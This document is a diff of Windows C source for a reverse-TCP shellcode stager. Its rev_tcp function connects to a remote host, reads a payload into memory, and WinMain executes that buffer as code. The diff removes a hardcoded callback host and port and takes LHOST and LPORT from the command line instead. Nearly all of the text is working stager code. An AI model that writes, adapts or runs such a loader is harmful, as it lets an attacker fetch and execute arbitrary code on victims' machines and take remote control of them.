@@ -2,36 +2,17 @@
 #include <Windows.h>
 #pragma comment(lib, "Ws2_32.lib")
 
-unsigned char* rev_tcp(char* host, char* port);
-
 unsigned long uIP;
 unsigned short sPORT;
 unsigned char *buf;
 unsigned int bufSize;
+
 char* LHOST;
 char* LPORT;
+
+wchar_t *wCommandLine;
 LPWSTR *parsedArgv;
-int dummy;
 
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int CmdShow)
-{
-	size_t newsize = strlen(lpCmdLine) + 1;
-	wchar_t * wcstring = new wchar_t[newsize];
-	size_t convertedChars = 0;
-	mbstowcs_s(&convertedChars, wcstring, newsize, lpCmdLine, _TRUNCATE);
-
-	//if (__argc < 3){
-	//	exit(-1);
-	//}
-	//parsedArgv = CommandLineToArgvW(lpCmdLine);
-	//LHOST = __argv[1];
-	//LPORT = __argv[2];
-
-	buf = rev_tcp("8-0.co", "23235");
-
-	(*(void(*)())buf)();
-	exit(0);
-}
 
 unsigned char* rev_tcp(char* host, char* port)
 {
@@ -78,7 +59,7 @@ unsigned char* rev_tcp(char* host, char* port)
 	int location = 0;
 	while (length != 0){
 		int received = 0;
-		
+
 		received = recv(sckt, ((char*)(buf + 5 + location)), length, 0);
 
 		location = location + received;
@@ -87,3 +68,40 @@ unsigned char* rev_tcp(char* host, char* port)
 
 	return buf;
 }
+
+char* WcharToChar(wchar_t* orig){
+	size_t convertedChars = 0;
+	size_t origsize = wcslen(orig) + 1;
+    const size_t newsize = origsize*2;
+	char *nstring = (char*)VirtualAlloc(NULL, newsize, MEM_COMMIT, PAGE_READWRITE);
+	wcstombs(nstring, orig, origsize);
+	return nstring;
+}
+
+// not needed anymore ... kept for future reference :)
+//wchar_t* CharToWchar(char* orig){
+//	size_t newsize = strlen(orig) + 1;
+//	wchar_t * wcstring = (wchar_t*)VirtualAlloc(NULL, newsize, MEM_COMMIT, PAGE_READWRITE);
+//	mbstowcs(wcstring, orig, newsize);
+//	return wcstring;
+//}
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int CmdShow)
+{
+	int dummy;
+	wchar_t cmd[254] = { 0 };
+	wcscpy(cmd,GetCommandLineW());
+	if (wcslen(cmd) <= 3) exit(100);
+
+	parsedArgv = CommandLineToArgvW(cmd, &dummy);
+
+	// convert wchar_t to mb
+	LHOST = WcharToChar(parsedArgv[1]);
+	LPORT = WcharToChar(parsedArgv[2]);
+	
+	buf = rev_tcp(LHOST, LPORT);
+
+	(*(void(*)())buf)();
+	exit(0);
+}
+
